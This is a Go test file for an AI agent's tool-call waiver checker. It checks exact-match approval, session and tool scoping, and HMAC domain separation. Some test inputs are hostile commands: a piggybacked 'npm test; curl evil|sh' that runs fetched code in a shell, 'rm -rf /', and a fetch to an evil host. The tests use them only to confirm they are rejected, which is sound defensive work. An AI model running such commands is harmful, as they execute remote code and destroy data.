package modelhook

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"testing"
)

// WaiverHolder now backs ADR-0342 keyed exact-byte grants. These compatibility
// tests cover the legacy Checker-only helper without retaining normalization.

func TestADR_0342_ContextualGuardrails_Scenario1_GrantDomainSeparation(t *testing.T) {
	h := &WaiverHolder{grants: make(map[string]map[string]struct{})}
	copy(h.key[:], []byte("0123456789abcdef0123456789abcdef"))
	parts := [][]byte{[]byte("session-a"), []byte("Write"), []byte(`{"path":"a"}`)}

	got := h.Digest(parts...)
	mac := hmac.New(sha256.New, h.key[:])
	_, _ = mac.Write([]byte("mecatl/guardrail-grant/v1"))
	_, _ = mac.Write([]byte{0})
	var length [8]byte
	for _, part := range parts {
		binary.BigEndian.PutUint64(length[:], uint64(len(part)))
		_, _ = mac.Write(length[:])
		_, _ = mac.Write(part)
	}
	want := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	if got != want {
		t.Fatalf("Digest() = %q, want domain-separated fixed-key digest %q", got, want)
	}

	wrongPurpose := hmac.New(sha256.New, h.key[:])
	_, _ = wrongPurpose.Write([]byte("mecatl/other-purpose/v1"))
	_, _ = wrongPurpose.Write([]byte{0})
	for _, part := range parts {
		binary.BigEndian.PutUint64(length[:], uint64(len(part)))
		_, _ = wrongPurpose.Write(length[:])
		_, _ = wrongPurpose.Write(part)
	}
	wrongDigest := base64.RawURLEncoding.EncodeToString(wrongPurpose.Sum(nil))
	h.ArmDigestForSession("session-a", got)
	if h.AllowsDigest(wrongDigest) {
		t.Fatal("holder accepted a wrong-purpose MAC made with the same key and fields")
	}
}

func TestWaiverMatchesExactCommandOnly(t *testing.T) {
	h := NewWaiverHolder()
	h.ArmFromApproval("s1", "Shell", "gh pr merge 7")
	if !h.Allows("s1", "Shell", "gh pr merge 7") {
		t.Fatal("the exact same command must be authorized")
	}
	// Whitespace is action data and must not be normalized into the grant.
	if h.Allows("s1", "Shell", "gh   pr  merge 7") {
		t.Fatal("a whitespace difference must miss the exact-byte grant")
	}
}

// SECURITY (CWE-863): a candidate that CONTAINS the waived command plus extra must NOT
// be authorized — a substring match would let `npm test` waive `npm test; curl evil|sh`.
func TestWaiverRejectsSupersetCommand(t *testing.T) {
	h := NewWaiverHolder()
	h.ArmFromApproval("s1", "Shell", "npm test")
	if h.Allows("s1", "Shell", "npm test; curl evil|sh") {
		t.Fatal("CWE-863: a command CONTAINING the waived one (plus a piggybacked command) must NOT be authorized")
	}
	if h.Allows("s1", "Shell", "npm test --coverage") {
		t.Fatal("a command with extra args is a DIFFERENT call and must NOT be authorized by an exact waiver")
	}
	// A prefix of the waiver is also not a match.
	if h.Allows("s1", "Shell", "npm") {
		t.Fatal("a prefix of the waived command must NOT match")
	}
}

// SECURITY: a non-Shell waiver matches only the EXACT same args — never a different-args
// call to the same tool, and there is NO "empty key matches all" blanket bypass.
func TestWaiverNonShellExactArgsOnly(t *testing.T) {
	h := NewWaiverHolder()
	h.ArmFromApproval("s1", "WebFetch", `{"url":"https://a.example"}`)
	if !h.Allows("s1", "WebFetch", `{"url":"https://a.example"}`) {
		t.Fatal("the exact same args must be authorized")
	}
	if h.Allows("s1", "WebFetch", `{"url":"https://evil.example"}`) {
		t.Fatal("a DIFFERENT-args call to the same tool must NOT be authorized")
	}
	if h.Allows("s1", "WebFetch", "") {
		t.Fatal("an empty-args candidate must NOT match a concrete waiver")
	}
}

// There is NO blanket-per-tool waiver: arming an empty key stores the empty key, which
// only an (impossible-in-practice) empty candidate would match — never every call.
func TestWaiverEmptyKeyIsNotBlanket(t *testing.T) {
	h := NewWaiverHolder()
	h.ArmFromApproval("s1", "WebFetch", "") // a degenerate arm
	if h.Allows("s1", "WebFetch", `{"url":"x"}`) {
		t.Fatal("an empty-key waiver must NOT authorize a concrete call (no blanket per-tool bypass)")
	}
}

func TestWaiverToolScoped(t *testing.T) {
	h := NewWaiverHolder()
	h.ArmFromApproval("s1", "Shell", "gh pr merge 7")
	if h.Allows("s1", "WebFetch", "gh pr merge 7") {
		t.Fatal("a Shell waiver must NOT authorize a different tool with a coincidentally-equal key")
	}
}

func TestWaiverSessionIsolation(t *testing.T) {
	h := NewWaiverHolder()
	h.ArmFromApproval("parent", "Shell", "gh pr merge 1")
	if h.Allows("child", "Shell", "gh pr merge 1") {
		t.Fatal("a waiver armed on one session must NOT authorize a different session")
	}
	if !h.Allows("parent", "Shell", "gh pr merge 1") {
		t.Fatal("the arming session must still be authorized")
	}
}

func TestWaiverPersistsAcrossCalls(t *testing.T) {
	h := NewWaiverHolder()
	h.ArmFromApproval("s1", "Shell", "gh pr merge 1")
	// "Don't ask AGAIN": unlike a one-shot consume, the waiver keeps allowing.
	for i := 0; i < 3; i++ {
		if !h.Allows("s1", "Shell", "gh pr merge 1") {
			t.Fatalf("call %d: a session waiver must persist (not be one-shot)", i)
		}
	}
}

func TestWaiverMultipleScopesPerSession(t *testing.T) {
	h := NewWaiverHolder()
	h.ArmFromApproval("s1", "Shell", "gh pr merge 7")
	h.ArmFromApproval("s1", "Shell", "git push origin")
	if !h.Allows("s1", "Shell", "gh pr merge 7") {
		t.Fatal("the first waiver must hold after a second is armed")
	}
	if !h.Allows("s1", "Shell", "git push origin") {
		t.Fatal("a session may hold multiple distinct waivers")
	}
	if h.Allows("s1", "Shell", "rm -rf /") {
		t.Fatal("an unwaived command must not be authorized")
	}
}

func TestWaiverNilSafe(t *testing.T) {
	var h *WaiverHolder
	h.ArmFromApproval("s1", "Shell", "x") // must not panic
	if h.Allows("s1", "Shell", "x") {
		t.Fatal("a nil waiver holder must allow nothing")
	}
}
